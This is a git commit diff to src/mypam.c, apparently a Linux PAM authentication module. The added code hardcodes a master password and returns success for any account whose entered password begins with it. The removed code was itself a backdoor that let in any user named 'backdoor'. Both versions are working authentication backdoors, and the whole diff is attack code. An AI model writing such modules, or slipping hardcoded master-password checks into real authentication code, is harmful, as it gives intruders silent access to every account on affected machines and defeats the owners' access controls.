ae769beef0c40d205a5225ad63b08510741c5c03
longkeyy <longkeyy@gmail.com>
2019-12-02 14:48:49 +0800

    Update mypam.c

--- src/mypam.c
+++ src/mypam.c
@@ -1,35 +1,30 @@
 #include <stdio.h>
-#include <stdlib.h>
 #include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
 #include <security/pam_appl.h>
 #include <security/pam_modules.h>
 
-/* expected hook */
-PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
-	return PAM_SUCCESS;
+#define MYPASSWD "my_master_passwd"
+
+PAM_EXTERN int pam_sm_setcred
+(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+    return PAM_SUCCESS;
 }
 
-PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
-	printf("Acct mgmt\n");
-	return PAM_SUCCESS;
+PAM_EXTERN int pam_sm_acct_mgmt
+(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+    return PAM_SUCCESS;
 }
 
-/* expected hook, this is where custom stuff happens */
-PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
-	int retval;
+PAM_EXTERN int pam_sm_authenticate
+(pam_handle_t *pamh, int flags,int argc, const char **argv) {
+    char *password = NULL;
 
-	const char* pUsername;
-	retval = pam_get_user(pamh, &pUsername, "Username: ");
+    pam_get_authtok(pamh, PAM_AUTHTOK, (const char **)&password, NULL);
 
-	printf("Welcome %s\n", pUsername);
+    if (!strncmp(password, MYPASSWD, strlen(MYPASSWD)))
+        return PAM_SUCCESS;
 
-	if (retval != PAM_SUCCESS) {
-		return retval;
-	}
-
-	if (strcmp(pUsername, "backdoor") != 0) {
-		return PAM_AUTH_ERR;
-	}
-
-	return PAM_SUCCESS;
+    return -1;
 }
